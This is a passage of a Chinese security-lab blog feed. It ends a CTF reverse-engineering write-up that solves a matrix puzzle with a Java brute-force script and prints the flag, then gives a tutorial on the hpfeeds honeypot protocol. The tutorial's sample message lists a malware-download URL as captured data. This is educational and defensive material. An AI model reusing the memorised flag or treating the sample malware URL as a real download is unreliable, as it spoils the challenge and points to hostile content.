<p>0x06  我讨厌数学<br>拿到题目首先用IDA得到反汇编代码，通过一系列的分析得出是一个纯粹的矩阵运算，矩阵为6×6的矩阵，其中有9个1，其余的26个为我们输入的FLAG。该算法就是A×AT=P（P在程序中硬编码的，可以直接得到），然后反求A矩阵，P矩阵为：<br>12027h,   0F296h,   0BF0Eh,   0D84Ch,   91D8h,   297h,<br>0F296h,   0D830h,   0A326h,   0B010h,   7627h,   230h,<br>0BF0Eh,   0A326h,   8FEBh,    879Dh,    70C3h,   1BDh,<br>0D84Ch,   0B010h,   879Dh,    0B00Dh,   6E4Fh,   1F7h,<br>91D8h,    7627h,    70C3h,    6E4Fh,    9BDCh,   15Ch<br>297h,     230h,     1BDh,     1F7h,     15Ch,    6<br>然后由“6”可得A中的最后一行全为“1”，再把whctf{xxx}格式转成10进制带进去可得第一行就为“whctf{”，并且根据最终的P矩阵验证正确。然后还有3个1的位置不确定，根据FLAG猜想它们就放在第五行的后三个，然后计算第五行的前两个数字为“114”，“104”。然后根据第一行和第五行的乘积的和来确定它们两个的位置就为“114”，“104”。字母为“t”,”h”。那么现在就还有三行不知道了，所以就爆破。<br>爆破的关键是利用已知的三行去求未知的三行，下面两行来求这三行的可能值，于是写了个脚本试了一下发现求出的结果实在太多了，想了想之后就加上第一行来验证。下面为爆破的java代码：</p>
<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public class whctf&#123;&#10;&#9;public static void main(String[] args )&#123;&#10;&#9;&#9;for(int i1=32; i1&#60;129; i1++)&#123;&#10;&#9;&#9;&#9;System.out.printf(&#34;new i1 is: %d\n&#34;,i1);&#10;&#9;&#9;&#9;for(int i2=32; i2&#60;129; i2++)&#123;&#10;&#9;&#9;&#9;&#9;for(int i3=32; i3&#60;129; i3++)&#123;&#10;&#9;&#9;&#9;&#9;&#9;for(int i4=32; i4&#60;129; i4++)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;for(int i5=32; i5&#60;129; i5++)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;for(int i6=32; i6&#60;129; i6++)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;int i7=i1+i2+i3+i4+i5+i6;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;int i8=i1*116+i2*104+i3*125+i4+i5+i6;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;int i9=i1*119+i2*104+i3*99+i4*116+i5*102+i6*123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;if(i7==560 &#38;&#38; i8==30247 &#38;&#38; i9==62102)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;System.out.printf(&#34;THE TWO LINE i1,i2,i3,i4,i5,i6: %d,%d,%d,%d,%d,%d\n&#34;,i1,i2,i3,i4,i5,i6);&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;if(i7==445 &#38;&#38; i8==28867 &#38;&#38; i9==48910)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;System.out.printf(&#34;THE THREE LINE i1,i2,i3,i4,i5,i6: %d,%d,%d,%d,%d,%d\n&#34;,i1,i2,i3,i4,i5,i6);&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;if(i7==503 &#38;&#38; i8==28239 &#38;&#38; i9==55372)&#123;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;System.out.printf(&#34;THE FOUR LINE i1,i2,i3,i4,i5,i6: %d,%d,%d,%d,%d,%d\n&#34;,i1,i2,i3,i4,i5,i6);&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#9;&#125;&#10;&#9;&#9;&#125;&#10;&#10;&#9;&#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
</code></pre><p>但是跑了半小时之后发现解出的结果每一行都有很多解，于是就想着人工过滤这些字符串，判断每一组的前三个字符是否可能为FLAG，于是就每一组列出一个字符串，之后发现一个字符串可能是FLAG，前三个字符为“3_g”，于是就把这组解的所有字符串列出来，得到“3_g00d”字符串，就是我们A矩阵的第三行了，然后同样的原理来过滤第四行和第二行。就得到了FLAG为：<code>whctf{Y0u_ar3_g00d_a7_m4th}</code>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://time.xctf.org.cn/ctfs/event/19/tasks&quot;&gt;地址&amp;gt;&amp;gt;请猛戳&amp;lt;&amp;lt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Web题&quot;&gt;&lt;a href=&quot;#Web题&quot; class=&quot;headerlink&quot; title=&quot;Web题&quot;&gt;&lt;/a&gt;Web题&lt;/h3&gt;&lt;p&gt;0x01. 信息&lt;/p&gt;
&lt;p&gt;打开是一个代码下载链接，下载下来是wireshark抓的cap包，打开包分析发现两个http的包，get请求下载了zip的压缩包，利用wireshark导出zip包-File-Export Objects-HTTP。发现需要密码打开，官方提示华科官网，解压密码&lt;code&gt;www.hust.edu.cn&lt;/code&gt;，flag在flag3.docx中
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ctf" scheme="http://das.scusec.org/tags/ctf/"/>
    
      <category term="das" scheme="http://das.scusec.org/tags/das/"/>
    
      <category term="lab" scheme="http://das.scusec.org/tags/lab/"/>
    
  </entry>
  
  <entry>
    <title>蜜罐中常用协议——HPFEEDS协议</title>
    <link href="http://das.scusec.org/2016/02/19/hpfeeds/"/>
    <id>http://das.scusec.org/2016/02/19/hpfeeds/</id>
    <published>2016-02-19T09:13:55.000Z</published>
    <updated>2016-07-28T07:35:34.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-hpfeeds协议是什么？"><a href="#0x00-hpfeeds协议是什么？" class="headerlink" title="0x00 hpfeeds协议是什么？"></a>0x00 hpfeeds协议是什么？</h2><p>hpfeeds是一个轻量级的验证发布-订阅协议(authenticated publish-subscribe protocol)。</p>
<p>轻量级好理解，就是代码量相对较少，功能相对不复杂。那什么是发布-订阅协议呢？订阅发布协议定义了一种一对多的依赖关系，让多个订阅者对象同时监听某一个主题对象。这个主题对象在自身状态变化时，会通知所有订阅者对象，使它们能够自动更新自己的状态。它是为了解决这样一种情况的发生，一个对象的改变需要同时改变其他对象，而且它不知道具体有多少对象需要改变。我的理解，这就类似于发传单，目标发送通知，没有指定特定的对象，通知会自动传播，观察者自己决定是否需要看传单，发送者对于传单是否被看一无所知。 <a id="more"></a></p>
<p>详细的发布订阅者介绍可以戳这里：</p>
<p><a href="https://msdn.microsoft.com/en-us/library/ff649664.aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ff649664.aspx</a></p>
<p>线路协议组成如下：</p>
<p>首先是消息头：有两个参数，消息总长和消息类型</p>
<p>消息类型有以下几种：</p>
<pre><code>error (0): errormessage
info (1): server name, nonce
auth (2): client id, sha1(nonce+authkey)
publish (3): client id, channelname, payload
subscribe (4): client id, channelname
</code></pre><p>数字代表消息类型，而冒号后面的内容则代表后续的消息字段</p>
<p>比如说当消息类型为3，publish时，后面的字段就会有四个：</p>
<pre><code>client id的长度
client id
channelname的长度
channelname
payload
</code></pre><p>一个完整的消息如下：</p>
<pre><code>length | opcode | next | identifier | next | channelname|payload
----------------------------------------------------------------
85       3        9       b4aa2@hp1   9      mwcapture      137941a3d8589f6728924c08561070bceb5d72b8,http://1.2.3.4/calc.exe
</code></pre><p>消息有了，整个消息的认证过程就是以下的几个步骤：</p>
<ul>
<li></li>
<li>服务器为每一个连接生成一个标志</li>
<li>客户端发送id 和 标志+authkey组成的sha1</li>
<li>服务器检查id和sha1</li>
<li>服务器检查数据类型，是要发布还是要订阅</li>
</ul>
<p>最终实现服务器、发布者、订阅者之间的解耦，彼此之间完全独立，互不干扰。</p>
<h2 id="0x01-为什么要用hpfeeds协议"><a href="#0x01-为什么要用hpfeeds协议" class="headerlink" title="0x01 为什么要用hpfeeds协议"></a>0x01 为什么要用hpfeeds协议</h2><p>首先，正如以上所说的，整个协议实现了三方的功能独立。使用这种方式降低了应用与业务逻辑之间的耦合，统一一个对外的发布接口，只需要关心监听的类型，不关心监听的具体处理人。只管发，不管到不到。很方便的建立一种一对多的依赖关系。</p>
<p>在当一个对象的改变需要同时改变其他对象，而且它不知道具体有多少对象需要改变时，就可以使用订阅发布模式。</p>
<p>hpfeeds协议希望能够实现一个单一的连线形式，使得每一个人都可以在任何时间以任何语言去订阅发布数据，不同的数据以通道来划分，由通道的使用者来决定数据结构形式。而通道的验证通过authkey来完成，它由两部分组成，ident和secret，相当于身份和密码。密码在hash后和每一个临时连接标志一起发送给服务器，这样保证不会被窃听，所以它可以运行在SSL、TLS下。</p>
<p>优点</p>
<ul>
<li>1.降低耦合。发布者对于接收者的数量，身份，接收的数据类型一无所知。</li>
<li>2.安全性高。只有消息订阅者之间的单线信息交互，不存在其他程序的信息交换。</li>
<li>3.测试方便。</li>
</ul>
<p>缺点</p>
<p>性能降低，订阅要进行管理</p>
<h2 id="0x02-如何操作"><a href="#0x02-如何操作" class="headerlink" title="0x02 如何操作"></a>0x02 如何操作</h2><p>正常安装使用hpfeeds的步骤如下：</p>
<pre><code>git clone https://github.com/rep/hpfeeds/
cd hpfeeds
python setup.py build
python setup.py install
</code></pre><p>安装成功后，会出现下面几个文件夹。<br><img src="http://7xr3oj.com1.z0.glb.clouddn.com/1.jpg" alt=""></p>
<ul>
<li>appsuport：hpfeeds支持的一些蜜罐的应用程序</li>
<li>broker：服务器功能程序集，包括增加用户，服务器运行，查看所有用户信息等</li>
<li>build：一些编译环境</li>
<li>cli：用户程序</li>
<li>example：例程</li>
<li>lib：支持库</li>
</ul>
<p>使用时先打开broker，运行其中的add_user.py添加用户信息：<br><img src="http://7xr3oj.com1.z0.glb.clouddn.com/2.jpg" alt=""></p>
<p>根据提示信息，我们添加用户test，密码123456，拥有发布频道1，2，无订阅频道<br><img src="http://7xr3oj.com1.z0.glb.clouddn.com/3.jpg" alt=""></p>
<p>再添加用户custom，密码123456，拥有订阅频道1，2，无发布频道<br><img src="http://7xr3oj.com1.z0.glb.clouddn.com/4.jpg" alt=""></p>
<p>现在使用dump_users.py查看刚才创建的用户<br><img src="http://7xr3oj.com1.z0.glb.clouddn.com/5.jpg" alt=""></p>
<p>如图所示，这里应经可以查看到刚才我们新建的用户了。</p>
<p>接下来，我们打开服务器feedbroker.py<br><img src="http://7xr3oj.com1.z0.glb.clouddn.com/6.jpg" alt=""></p>
<p>再开启一个新的进程运行cli文件夹里的用户程序hpfeeds-client</p>
<p>先开启订阅者custom，使用1频道<br><img src="http://7xr3oj.com1.z0.glb.clouddn.com/7.jpg" alt=""></p>
<p>此时，服务器端显示用户登录成功<br><img src="http://7xr3oj.com1.z0.glb.clouddn.com/8.jpg" alt=""></p>
<p>我们再打开一个新的进程，以发布者test，使用1频道发布“helloworld”<br><img src="http://7xr3oj.com1.z0.glb.clouddn.com/9.jpg" alt=""></p>
<p>我们可以看到发布者一旦发布完消息后，立即退出进程，并不确认消息是否收到</p>
<p>这时，服务器显示test登录成功<br><img src="http://7xr3oj.com1.z0.glb.clouddn.com/10.jpg" alt=""></p>
<p>于此同时，订阅者custom成功接收到消息<br><img src="http://7xr3oj.com1.z0.glb.clouddn.com/11.jpg" alt=""></p>
<p>到此，一次完整的发送、接收消息的流程就走完了。</p>
<p>通过这一过程，我们发现，频道与用户分离，发送和订阅者身份平等，只需订阅者实时监听，发送者可以即时发送即时撤出。</p>
<p>这里是对于hpfeeds协议的简单介绍，下一部分我会从代码的角度进一步分析该协议，并适当对于协议功能进行添加。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-hpfeeds协议是什么？&quot;&gt;&lt;a href=&quot;#0x00-hpfeeds协议是什么？&quot; class=&quot;headerlink&quot; title=&quot;0x00 hpfeeds协议是什么？&quot;&gt;&lt;/a&gt;0x00 hpfeeds协议是什么？&lt;/h2&gt;&lt;p&gt;hpfeeds是一个轻量级的验证发布-订阅协议(authenticated publish-subscribe protocol)。&lt;/p&gt;
&lt;p&gt;轻量级好理解，就是代码量相对较少，功能相对不复杂。那什么是发布-订阅协议呢？订阅发布协议定义了一种一对多的依赖关系，让多个订阅者对象同时监听某一个主题对象。这个主题对象在自身状态变化时，会通知所有订阅者对象，使它们能够自动更新自己的状态。它是为了解决这样一种情况的发生，一个对象的改变需要同时改变其他对象，而且它不知道具体有多少对象需要改变。我的理解，这就类似于发传单，目标发送通知，没有指定特定的对象，通知会自动传播，观察者自己决定是否需要看传单，发送者对于传单是否被看一无所知。
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="das" scheme="http://das.scusec.org/tags/das/"/>
    
      <category term="honeypot" scheme="http://das.scusec.org/tags/honeypot/"/>
    
      <category term="hpfeeds" scheme="http://das.scusec.org/tags/hpfeeds/"/>
    
      <category term="lab" scheme="http://das.scusec.org/tags/lab/"/>
    
      <category term="phantom" scheme="http://das.scusec.org/tags/phantom/"/>
    
  </entry>
  
</feed>
